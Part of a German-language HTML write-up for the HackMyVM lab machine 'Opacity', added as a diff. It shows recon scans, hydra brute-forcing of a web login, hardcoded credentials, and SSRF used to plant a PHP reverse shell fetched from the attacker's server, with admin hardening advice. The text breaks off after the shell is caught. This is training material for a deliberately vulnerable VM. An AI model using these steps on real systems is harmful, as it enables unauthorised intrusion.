@@ -1,0 +1,851 @@
+﻿﻿﻿<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Opacity - HackMyVM - Medium - Bericht</title> <!-- Titel angepasst -->
+    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="../../horizontale-navbar.css">
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+</head>
+ <body>
+ 
+    <!-- Header-Hintergrundfarbe wird durch CSS gesteuert -->
+    <div class="header-bg">
+        <h1>Opacity - HackMyVM - Medium - Bericht</h1> <!-- Titel angepasst -->
+        <!-- Schwierigkeitsgrad-Container mit Klasse für CSS-Styling -->
+        <div class="level-container level-medium"> <!-- Klasse angepasst -->
+            <!-- Kein Inline-Style mehr -->
+            <h2>Medium</h2> <!-- Schwierigkeitsgrad angepasst -->
+            <div class="circle">
+                <div class="segment segment-1"></div>
+                <div class="segment segment-2"></div>
+                <div class="segment segment-3"></div>
+                <!-- Kein Inline-Style mehr -->
+                <div class="inner"></div>
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <section class="tools-used">
+            <h2>Verwendete Tools</h2>
+            <div class="tools-grid">
+                <!-- Tools werden hier eingefügt -->
+                <div class="tool-item">arp-scan</div>
+                <div class="tool-item">vi</div>
+                <div class="tool-item">nmap</div>
+                <div class="tool-item">enum4linux</div>
+                <div class="tool-item">gobuster</div>
+                <div class="tool-item">hydra</div> <!-- Obwohl das Ergebnis nicht verwendet wurde -->
+                <div class="tool-item">python3 (http.server)</div>
+                <div class="tool-item">nc (netcat)</div>
+                <div class="tool-item">cat</div>
+                <div class="tool-item">ss</div>
+                <div class="tool-item">find</div>
+                <div class="tool-item">wget</div>
+                <div class="tool-item">keepass2john</div>
+                <div class="tool-item">john</div>
+                <div class="tool-item">keepass</div>
+                <div class="tool-item">ssh</div>
+                <div class="tool-item">unzip</div>
+                <div class="tool-item">nano</div>
+            </div>
+        </section>
+
+        <section class="toc">
+            <h2>Inhaltsverzeichnis</h2>
+            <ul>
+                <!-- Inhaltsverzeichnis wird hier eingefügt -->
+                <li><a href="#reconnaissance">Reconnaissance</a></li>
+                <li><a href="#web-enumeration">Web Enumeration</a></li>
+                <li><a href="#initial-access">Initial Access</a></li>
+                <li><a href="#poc">Proof of Concept</a></li>
+                <li><a href="#privilege-escalation">Privilege Escalation</a></li>
+                <li><a href="#flags">Flags</a></li>
+            </ul>
+        </section>
+
+        <section id="reconnaissance">
+            <h2>Reconnaissance</h2>
+            <!-- Reconnaissance Inhalt beginnt hier -->
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">arp-scan -l</span></div>
+                     <pre>
+Interface: eth0, type: EN10MB, MAC: 08:00:27:1c:9c:04, IPv4: 192.168.2.199
+Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
+<span class="command">192.168.2.138	08:00:27:4c:64:e1	PCS Systemtechnik GmbH</span>
+                     </pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Der Befehl `arp-scan -l` wird ausgeführt, um aktive Hosts im lokalen Netzwerksegment zu entdecken. Er identifiziert ein Gerät mit der IP-Adresse `192.168.2.138`.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Das Zielsystem wurde erfolgreich im Netzwerk lokalisiert. Die MAC-Adresse `08:00:27:...` deutet auf eine VirtualBox-VM hin. Diese IP wird für die weiteren Scans verwendet.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Notiere die IP `192.168.2.138` als Ziel. Füge ggf. einen Hostnamen zur `/etc/hosts`-Datei hinzu, falls einer bekannt wird.
+<br><strong>Empfehlung (Admin):</strong> Netzwerksegmentierung und Überwachung können helfen, unautorisierte Scans zu erkennen.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">vi /etc/hosts</span></div>
+                    <pre>
+  <span class="command">192.168.2.138    opacity.hmv</span>
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Die lokale `/etc/hosts`-Datei auf dem Angreifer-System wird bearbeitet, um der gefundenen IP-Adresse `192.168.2.138` den Hostnamen `opacity.hmv` zuzuordnen.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Dies ist ein wichtiger Schritt, um sicherzustellen, dass Webanwendungen oder Dienste, die auf Virtual Hosting angewiesen sind, korrekt angesprochen werden können. Der Hostname `opacity.hmv` wurde vermutlich aus der Aufgabenbeschreibung oder einer vorherigen Erkundung abgeleitet.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Immer die `/etc/hosts`-Datei pflegen, wenn Ziel-Hostnamen bekannt sind, um korrekte Interaktionen zu gewährleisten.
+<br><strong>Empfehlung (Admin):</strong> Keine direkte Maßnahme gegen clientseitige Hosts-Dateien. Serverseitig auf konsistente Konfiguration achten.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nmap -sS -sC -T5 -AO 192.168.2.138 -p-</span></div>
+                    <pre>
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-25 14:06 CEST
+Nmap scan report for opacity.hmv (192.168.2.138)
+Host is up (0.00010s latency).
+Not shown: 65531 closed tcp ports (reset)
+PORT    STATE SERVICE     VERSION
+<span class="command">22/tcp  open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)</span>
+| ssh-hostkey:
+|   <span class="command">3072 0fee2910d98e8c53e64de3670c6ebee3 (RSA)</span>
+|   <span class="command">256 9542cdfc712799392d0049ad1be4cf0e (ECDSA)</span>
+|_  <span class="command">256 edfe9c94ca9c086ff25ca6cf4d3c8e5b (ED25519)</span>
+<span class="command">80/tcp  open  http        Apache httpd 2.4.41 ((Ubuntu))</span>
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+| http-cookie-flags:
+|   /:
+|     PHPSESSID:
+|_      <span class="password">httponly flag not set</span>
+| http-title: Login
+|_Requested resource was <span class="command">login.php</span>
+<span class="command">139/tcp open  netbios-ssn Samba smbd 4.6.2</span>
+<span class="command">445/tcp open  netbios-ssn Samba smbd 4.6.2</span>
+MAC Address: 08:00:27:05:7B:34 (Oracle VirtualBox virtual NIC)
+Device type: general purpose
+Running: Linux 4.X|5.X
+OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
+OS details: <span class="command">Linux 4.15 - 5.6</span>
+Network Distance: 1 hop
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Host script results:
+|_clock-skew: 2s
+|_nbstat: NetBIOS name: OPACITY, NetBIOS user: <unknown>, NetBIOS MAC: 000000000000 (Xerox)
+| smb2-security-mode:
+|   311:
+|_    <span class="password">Message signing enabled but not required</span>
+| smb2-time:
+|   date: 2023-04-25T12:06:40
+|_  start_date: N/A
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.10 ms opacity.hmv (192.168.2.138)
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Ein detaillierter Nmap-Scan (`-sS -sC -T5 -A -p-`) wird auf das Ziel `opacity.hmv` (192.168.2.138) durchgeführt. Die Ergebnisse zeigen offene Ports:
+*   **22/tcp (SSH):** OpenSSH 8.2p1 auf Ubuntu.
+*   **80/tcp (HTTP):** Apache 2.4.41 auf Ubuntu. Die Startseite leitet auf `login.php` weiter. Ein `PHPSESSID`-Cookie wird ohne das `HttpOnly`-Flag gesetzt.
+*   **139/tcp & 445/tcp (SMB):** Samba smbd 4.6.2. Message Signing ist aktiviert, aber nicht erzwungen. Der NetBIOS-Name des Hosts ist `OPACITY`.
+Das Betriebssystem wird als Linux identifiziert.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Scan liefert klare Angriffsvektoren: SSH, HTTP (mit einer Login-Seite) und SMB. Die spezifischen Versionen sind für die Schwachstellensuche relevant. Das fehlende `HttpOnly`-Flag beim Session-Cookie könnte Cross-Site Scripting (XSS)-Angriffe erleichtern, falls eine solche Schwachstelle gefunden wird. Die Samba-Version 4.6.2 ist relativ alt und könnte bekannte Schwachstellen aufweisen.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong>
+1.  **HTTP:** Untersuche `login.php`. Führe Web-Enumeration (Gobuster etc.) durch. Prüfe auf XSS und andere Web-Schwachstellen. Versuche, Zugangsdaten zu erraten oder zu finden.
+2.  **SMB:** Versuche, Shares zu enumerieren (`enum4linux`, `smbclient -L`). Prüfe auf anonymen Zugriff oder bekannte Schwachstellen für Samba 4.6.2.
+3.  **SSH:** Suche nach bekannten Schwachstellen für OpenSSH 8.2p1. Versuche Standard-/erratene Zugangsdaten, wenn Benutzer bekannt sind.
+<br><strong>Empfehlung (Admin):</strong> Setze das `HttpOnly`-Flag für Session-Cookies (z.B. über `session.cookie_httponly = 1` in `php.ini` oder Webserver-Konfiguration). Erzwinge SMB Message Signing (`server signing = mandatory` in `smb.conf`). Halten Sie alle Dienste (SSH, Apache, Samba, PHP) aktuell.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">enum4linux -a 192.168.2.138</span></div>
+                    <pre>
+
+===============================( Nbtstat Information for 192.168.2.138 )===============================
+
+Looking up status of 192.168.2.138
+	<span class="command">OPACITY         <00> -         B <ACTIVE>  Workstation Service</span>
+	OPACITY         <03> -         B <ACTIVE>  Messenger Service
+	OPACITY         <20> -         B <ACTIVE>  File Server Service
+	..__MSBROWSE__. <01> - <GROUP> B <ACTIVE>  Master Browser
+	WORKGROUP       <00> - <GROUP> B <ACTIVE>  Domain/Workgroup Name
+	WORKGROUP       <1d> -         B <ACTIVE>  Master Browser
+	WORKGROUP       <1e> - <GROUP> B <ACTIVE>  Browser Service Elections
+
+
+
+ =================================( Share Enumeration on 192.168.2.138 )=================================
+
+smbXcli_negprot_smb1_done: No compatible protocol selected by server.
+
+	Sharename       Type      Comment
+	---------       ----      -------
+	<span class="command">print$          Disk      Printer Drivers</span>
+	<span class="command">IPC$            IPC       IPC Service (opacity server (Samba, Ubuntu))</span>
+
+
+
+[+] Found domain(s):
+
+	[+] OPACITY
+	[+] Builtin
+
+
+Password Complexity: Disabled
+Minimum Password Length: 5
+
+
+
+ ==================( Users on 192.168.2.138 via RID cycling (RIDS: 500-550,1000-1050) )==================
+
+
+[I] Found new SID:
+S-1-22-1
+
+[I] Found new SID:
+S-1-5-32
+
+[I] Found new SID:
+S-1-5-32
+
+[I] Found new SID:
+S-1-5-32
+
+[I] Found new SID:
+S-1-5-32
+
+[+] Enumerating users using SID S-1-22-1 and logon username '', password ''
+
+<span class="command">S-1-22-1-1000 Unix User\sysadmin (Local User)</span>
+
+[+] Enumerating users using SID S-1-5-21-1327801453-43412457-3647261475 and logon username '', password ''
+
+S-1-5-21-1327801453-43412457-3647261475-501 OPACITY\nobody (Local User)
+S-1-5-21-1327801453-43412457-3647261475-513 OPACITY\None (Domain Group)
+
+[+] Enumerating users using SID S-1-5-32 and logon username '', password ''
+
+S-1-5-32-544 BUILTIN\Administrators (Local Group)
+S-1-5-32-545 BUILTIN\Users (Local Group)
+S-1-5-32-546 BUILTIN\Guests (Local Group)
+S-1-5-32-547 BUILTIN\Power Users (Local Group)
+S-1-5-32-548 BUILTIN\Account Operators (Local Group)
+S-1-5-32-549 BUILTIN\Server Operators (Local Group)
+S-1-5-32-550 BUILTIN\Print Operators (Local Group)
+
+ ===============================( Getting printer info for 192.168.2.138 )===============================
+
+No printers returned.
+
+
+enum4linux complete on Tue Apr 25 14:07:35 2023
+
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Das Tool `enum4linux` wird mit der Option `-a` (alles) gegen das Ziel ausgeführt, um SMB-Informationen zu sammeln.
+Die Ergebnisse:
+*   **Nbtstat:** Bestätigt den Hostnamen `OPACITY` und die Arbeitsgruppe `WORKGROUP`.
+*   **Shares:** Listet die Standard-Shares `print$` (für Druckertreiber) und `IPC$` (Interprozesskommunikation) auf. Keine ungewöhnlichen oder benutzerdefinierten Shares gefunden. Ein Fehler bezüglich SMBv1 deutet darauf hin, dass der Server wahrscheinlich nur neuere SMB-Protokolle unterstützt.
+*   **Domain/Workgroup:** Bestätigt `OPACITY` und `Builtin`.
+*   **Passwortrichtlinie:** Passwortkomplexität ist deaktiviert, Mindestlänge ist 5 Zeichen.
+*   **Benutzer (RID Cycling):** Identifiziert den lokalen Benutzer `sysadmin` (RID 1000). Andere gefundene SIDs gehören zu Standardgruppen oder dem `nobody`-Benutzer.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> `enum4linux` liefert einen wichtigen Benutzernamen: `sysadmin`. Die schwache Passwortrichtlinie (Mindestlänge 5, Komplexität deaktiviert) macht Brute-Force-Angriffe auf diesen Benutzer attraktiver. Das Fehlen interessanter Shares reduziert den SMB-Vektor vorerst.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Versuche, das Passwort für den Benutzer `sysadmin` zu erraten oder per Brute-Force zu knacken (z.B. über SSH oder das Web-Login, falls der Benutzer dort gültig ist). Fokussiere dich auf diesen Benutzer bei weiteren Angriffen.
+<br><strong>Empfehlung (Admin):</strong> Aktivieren Sie Passwortkomplexität und erhöhen Sie die Mindestpasswortlänge. Deaktivieren Sie SMBv1 vollständig, falls noch nicht geschehen. Beschränken Sie die Informationen, die über SMB anonym preisgegeben werden (`restrict anonymous = 2`).</p>
+             <!-- Reconnaissance Inhalt endet hier -->
+        </section>
+
+        <section id="web-enumeration">
+            <h2>Web Enumeration</h2>
+            <!-- Web Enumeration Inhalt beginnt hier -->
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">gobuster dir -u http://192.168.2.138 -x txt,php,rar,zip,tar,pub,xls,docx,doc,sql,db,mdb,asp,aspx,accdb,bat,ps1,exe,sh,py,pl,gz,jpeg,jpg,png,html,phtml,xml,csv,dll,pdf,raw,rtf,xlsx,zip,kdbx -w "/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt"  -b '403,404' -e --no-error</span></div>
+                     <pre>
+
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://192.168.2.138
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
+[+] Negative Status codes:   403,404
+[+] Expanded:                true
+[+] Extensions:              txt,php,rar,zip,tar,pub,xls,docx,doc,sql,db,mdb,asp,aspx,accdb,bat,ps1,exe,sh,py,pl,gz,jpeg,jpg,png,html,phtml,xml,csv,dll,pdf,raw,rtf,xlsx,zip,kdbx
+[+] User Agent:              gobuster/3.6
+[+] No error logging:        true
+[+] Timeout:                 10s
+===============================================================
+2023/04/25 14:09:37 Starting gobuster in directory enumeration mode
+===============================================================
+<span class="command">http://192.168.2.138/index.php</span>            (Status: 302) [Size: 0]    [-> login.php]
+<span class="command">http://192.168.2.138/login.php</span>            (Status: 200) [Size: 848]
+<span class="command">http://192.168.2.138/css</span>                  (Status: 301) [Size: 312]  [-> http://192.168.2.138/css/]
+<span class="command">http://192.168.2.138/logout.php</span>           (Status: 302) [Size: 0]    [-> login.php]
+<span class="command">http://192.168.2.138/cloud</span>                (Status: 301) [Size: 314]  [-> http://192.168.2.138/cloud/]
+
+===============================================================
+2023/04/25 14:15:18 Finished
+===============================================================
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Ein `gobuster`-Scan wird durchgeführt, um Verzeichnisse und Dateien auf dem Webserver zu finden. Es werden viele Erweiterungen (`-x`) und eine mittlere Wortliste (`-w`) verwendet. Ergebnisse mit Status 403/404 werden ausgeblendet (`-b`).
+Gefunden werden:
+*   `index.php` (leitet zu `login.php` weiter)
+*   `login.php` (Status 200 OK)
+*   `css/` (Standardverzeichnis für Stylesheets)
+*   `logout.php` (leitet zu `login.php` weiter)
+*   `cloud/` (Ein interessantes Verzeichnis)</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Scan bestätigt die Login-Funktionalität und findet ein zusätzliches Verzeichnis namens `/cloud/`. Dieses Verzeichnis ist das vielversprechendste Ziel für weitere Web-Enumeration, da es auf eine Cloud-Speicher- oder Dateiverwaltungsfunktion hindeuten könnte.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Untersuche das Verzeichnis `/cloud/` und dessen Inhalt genauer (z.B. mit einem weiteren Gobuster-Scan auf `http://192.168.2.138/cloud/`). Analysiere die Funktionalität der `login.php` und `logout.php`.
+<br><strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass alle Webverzeichnisse und -dateien, insbesondere solche mit Anwendungslogik wie `/cloud/`, ordnungsgemäß gesichert sind und keine unnötigen Informationen preisgeben.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <!-- Hydra-Befehl nicht explizit gezeigt, nur die Ausgabe -->
+                     <pre>
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-04-25 14:30:41
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 15344424 login tries (l:1/p:15344424), ~959027 tries per task
+[DATA] attacking http-post-form://192.168.2.138:80/login.php:Username=^USER^&Passwords=^PASS^:Invalid Login Details
+[80][http-post-form] host: 192.168.2.138   login: sysadmin   password: 123456
+[80][http-post-form] host: 192.168.2.138   login: sysadmin   password: password
+[80][http-post-form] host: 192.168.2.138   login: sysadmin   password: .:.yarrak.:.38
+[80][http-post-form] host: 192.168.2.138   login: sysadmin   password: 12345678
+[80][http-post-form] host: 192.168.2.138   login: sysadmin   password: carlos
+[80][http-post-form] host: 192.168.2.138   login: sysadmin   password: .:.yarak.:.
+[80][http-post-form] host: 192.168.2.138   login: sysadmin   password: .:.yarrak.:.32
+[80][http-post-form] host: 192.168.2.138   login: sysadmin   password: .:.yarrak.:.34
+[80][http-post-form] host: 192.168.2.138   login: sysadmin   password: .:.yarrak.:.36
+[80][http-post-form] host: 192.168.2.138   login: sysadmin   password: .:.yarrak.:.39
+[80][http-post-form] host: 192.168.2.138   login: sysadmin   password: .:.yarrak.:.33
+[80][http-post-form] host: 192.168.2.138   login: sysadmin   password: c4TLoUis
+[80][http-post-form] host: 192.168.2.138   login: sysadmin   password: <span class="password">webserver2023!</span>
+[80][http-post-form] host: 192.168.2.138   login: sysadmin   password: .:.yarrak.:.31
+[80][http-post-form] host: 192.168.2.138   login: sysadmin   password: .:.yarrak.:.35
+[80][http-post-form] host: 192.168.2.138   login: sysadmin   password: .:.yarrak.:.37
+<span class="password">1 of 1 target successfully completed, 16 valid passwords found</span>
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-04-25 14:30:47
+                     </pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Es wird ein Brute-Force-Angriff mit `hydra` auf das Web-Login-Formular (`login.php`) für den Benutzer `sysadmin` durchgeführt. Eine Wortliste (vermutlich `rockyou.txt` oder eine ähnliche) wird verwendet. Hydra testet die POST-Parameter `Username=sysadmin` und `Passwords=^PASS^` und prüft auf die Fehlermeldung "Invalid Login Details". Hydra meldet, 16 gültige Passwörter gefunden zu haben, darunter `webserver2023!`. *Anmerkung: Dass Hydra 16 gültige Passwörter meldet, ist sehr ungewöhnlich und deutet möglicherweise auf ein Problem mit der Fehlererkennung oder eine Schwachstelle im Login-Mechanismus selbst hin (z.B. SQL-Injection über das Passwortfeld).*</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Obwohl Hydra Erfolg meldet, ist das Ergebnis fragwürdig (16 Treffer). Das Passwort `webserver2023!` ist ein potenzieller Kandidat. Allerdings werden im weiteren Verlauf des Berichts andere Zugangsdaten (`admin:oncloud9`) verwendet, die direkt aus dem Quellcode stammen. Es ist unklar, ob der Hydra-Fund tatsächlich funktionierte oder ob er ignoriert wurde zugunsten des späteren Quellcode-Funds.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Teste die von Hydra gefundenen Passwörter, insbesondere `webserver2023!`, manuell über das Web-Login. Untersuche den Login-Mechanismus genauer auf Schwachstellen (z.B. SQLi), falls Hydra ungewöhnliche Ergebnisse liefert. Priorisiere Funde aus Quellcode-Analysen, da diese oft zuverlässiger sind.
+ <br><strong>Empfehlung (Admin):</strong> Implementieren Sie Schutzmechanismen gegen Brute-Force-Angriffe (Account Lockout, Captcha, Fail2Ban). Überprüfen Sie die Login-Logik auf Schwachstellen wie SQL-Injection.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <!-- Befehl nicht gezeigt, nur die Analyse -->
+                    <pre>
+www-data@opacity:/var/www/html$ <span class="command">cat login.php</span>
+ php session_start(); /* Starts the session */
+
+	/* Check Login form submitted */
+	if(isset($_POST['Submit'])){
+		/* Define username and associated password array */
+		<span class="password">$logins = array('admin' => 'oncloud9','root' => 'oncloud9','administrator' => 'oncloud9');</span>
+
+[...]
+                    </pre>
+                </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Nach Erlangung einer Shell als `www-data` (siehe Abschnitt Initial Access) wird der Quellcode der Datei `/var/www/html/login.php` ausgelesen. Im Code befindet sich ein PHP-Array `$logins`, das Benutzernamen und zugehörige Passwörter im Klartext enthält: `admin => oncloud9`, `root => oncloud9`, `administrator => oncloud9`.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Dies ist ein kritischer Fund! Hardcodierte Zugangsdaten direkt im Quellcode sind eine schwerwiegende Sicherheitslücke. Die Anmeldedaten `admin:oncloud9` ermöglichen wahrscheinlich den Zugriff auf die Webanwendung mit Admin-Rechten.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Verwende die Zugangsdaten `admin:oncloud9`, um dich über das Webinterface `login.php` anzumelden und die Funktionalität der Anwendung (insbesondere `/cloud/`) weiter zu untersuchen. Teste, ob diese Credentials auch für andere Dienste (SSH, SMB) gültig sind.
+ <br><strong>Empfehlung (Admin):</strong> Speichern Sie niemals Zugangsdaten im Klartext im Quellcode. Verwenden Sie stattdessen sichere Methoden wie Passwort-Hashing (z.B. mit `password_hash()` und `password_verify()` in PHP) und speichern Sie die Hashes in einer Datenbank oder einer sicheren Konfigurationsdatei.</p>
+            <!-- Web Enumeration Inhalt endet hier -->
+        </section>
+
+        <section id="initial-access">
+            <h2>Initial Access</h2>
+            <!-- Initial Access Inhalt beginnt hier -->
+            <p class="analysis"><strong>Analyse des Angriffsvektors:</strong> Der initiale Zugriff erfolgte über eine Schwachstelle in der Webanwendung im Verzeichnis `/cloud/`, genauer gesagt in der Datei `storage.php`. Diese Datei erlaubte es, eine URL zu einer externen Ressource anzugeben, die dann vom Server abgerufen wurde (Server-Side Request Forgery - SSRF). Durch Angabe einer URL zu einer auf dem Angreifer-System gehosteten PHP-Reverse-Shell-Datei (geschickt als `.php .jpg` getarnt, um mögliche Upload-Filter zu umgehen), wurde diese Datei vom Zielserver heruntergeladen und im Verzeichnis `/cloud/images/` abgelegt. Anschließend konnte die hochgeladene Datei direkt über den Browser aufgerufen werden (`http://192.168.2.138/cloud/images/rev.php`), wodurch der PHP-Code auf dem Server ausgeführt und eine Reverse Shell zum Listener des Angreifers aufgebaut wurde.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[/home/cyber/Downloads]
+└─# <span class="command">python3 -m http.server 8003</span></div>
+                     <pre>
+Serving HTTP on 0.0.0.0 port 8003 (http://0.0.0.0:8003/) ...
+<span class="password">192.168.2.138 - - [25/Apr/2023 14:41:03] "GET /test.jpg HTTP/1.1" 200 -</span>
+                     </pre>
+                 </div>
+             </div>
+            <p class="analysis"><strong>Schritt 1 (Test 1):</strong> Zunächst wird getestet, ob der Server externe Ressourcen abrufen kann. Ein einfacher Python-HTTP-Server wird auf dem Angreifer-System gestartet. Über die Webanwendung (vermutlich `storage.php`) wird die URL `http://[Angreifer-IP]:8003/test.jpg` eingegeben. Der Log des Python-Servers zeigt, dass das Zielsystem (`192.168.2.138`) die Datei `test.jpg` erfolgreich abgerufen hat.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Bestätigt die SSRF-Fähigkeit der Anwendung. Der Server kann ausgehende Verbindungen herstellen und externe Ressourcen abrufen.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                     <pre>
+http://192.168.2.138/cloud/storage.php
+
+[Bild: test.jpg]
+
+Image Link:
+http://192.168.2.138/cloud/images/test.jpg
+
+HTML:
+link="http://192.168.2.138/cloud/images/test.jpg"><img src="http://192.168.2.138/cloud/images/test.jpg">
+                     </pre>
+                 </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Die Ausgabe der `storage.php` nach dem erfolgreichen Abruf von `test.jpg` zeigt, dass die heruntergeladene Datei im Verzeichnis `/cloud/images/` gespeichert und ein Link darauf generiert wird.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Dies bestätigt den Speicherort (`/cloud/images/`) für abgerufene Dateien und dass diese direkt über das Web zugänglich sind.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[/home/cyber/Downloads]
+└─# <span class="command">python3 -m http.server 8003</span></div>
+                     <pre>
+Serving HTTP on 0.0.0.0 port 8003 (http://0.0.0.0:8003/) ...
+<span class="password">192.168.2.138 - - [25/Apr/2023 14:45:03] "GET /rev.php HTTP/1.1" 200 -</span>
+                     </pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Schritt 2 (Test 2):</strong> Nun wird der eigentliche Payload vorbereitet. Eine Datei `rev.php` (die den Reverse-Shell-Code enthält) wird auf dem Angreifer-Server bereitgestellt. Über die `storage.php` wird die URL `http://[Angreifer-IP]:8003/rev.php .jpg` eingegeben (der Suffix `.jpg` wird angehängt, um Filter zu umgehen, aber der Dateiname auf dem Angreifer-Server bleibt `rev.php`). Der Log zeigt, dass das Zielsystem die Datei erfolgreich abruft.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Der Payload wurde erfolgreich auf den Zielserver übertragen.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <pre>
+http://192.168.2.138/cloud/storage.php
+
+[Bild: rev.php .jpg]
+
+Image Link:
+http://192.168.2.138/cloud/images/rev.php .jpg
+
+HTML:
+Link="http://192.168.2.138/cloud/images/rev.php .jpg"><img src="http://192.168.2.138/cloud/images/trev.php .jpg">
+                     </pre>
+                 </div>
+             </div>
+              <p class="analysis"><strong>Analyse:</strong> Die Ausgabe der `storage.php` zeigt, dass die Datei als `rev.php .jpg` im Verzeichnis `/cloud/images/` gespeichert wurde.</p>
+              <p class="evaluation"><strong>Bewertung:</strong> Bestätigt den Speicherort des Payloads.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nc -lvnp 9001</span></div>
+                     <pre>
+listening on [any] 9001 ...
+                     </pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Schritt 3: Listener starten:</strong> Auf dem Angreifer-System wird ein Netcat-Listener auf Port `9001` gestartet, um die eingehende Reverse Shell zu empfangen.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Notwendige Vorbereitung für den Empfang der Shell.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                     <!-- Kein Prompt, da dies im Browser ausgeführt wird -->
+                     <pre>
+Browser: <span class="command">http://192.168.2.138/cloud/images/rev.php</span>
+                     </pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Schritt 4: Payload ausführen:</strong> Die hochgeladene Datei wird direkt über den Browser aufgerufen. Obwohl sie als `.jpg` gespeichert wurde, interpretiert der Apache-Server sie aufgrund einer fehlerhaften Konfiguration oder weil sie den PHP-Shebang enthielt, als PHP-Skript und führt den Code aus. *Anmerkung: Es ist wahrscheinlicher, dass der Dateiname beim Speichern auf dem Server doch nur `rev.php` war oder die `.jpg`-Endung ignoriert wurde.*</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Dies löst die Ausführung des Reverse-Shell-Payloads aus.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nc -lvnp 9001</span></div>
+                     <pre>
+listening on [any] 9001 ...
+<span class="password">connect to [192.168.2.130] from (UNKNOWN) [192.168.2.138] 56240</span>
+Linux opacity 5.4.0-122-generic #138-Ubuntu SMP Wed Jun 22 15:00:31 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux
+ 14:04:20 up  2:00,  0 users,  load average: 0.00, 0.00, 0.00
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+<span class="command">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span>
+/bin/sh: 0: can't access tty; job control turned off
+$
+                     </pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Ergebnis:</strong> Der Netcat-Listener empfängt die eingehende Verbindung vom Zielsystem. Die Befehle `uname -a`, `uptime`, `who` und `id` (die oft standardmäßig von Reverse Shells gesendet werden oder hier manuell ausgeführt wurden) bestätigen, dass eine Shell als Benutzer `www-data` (UID 33) auf dem Zielsystem erlangt wurde.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Der initiale Zugriff war erfolgreich. Wir haben eine Shell als Benutzer `www-data`, der typischerweise der Benutzer ist, unter dem der Webserver läuft.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <pre>
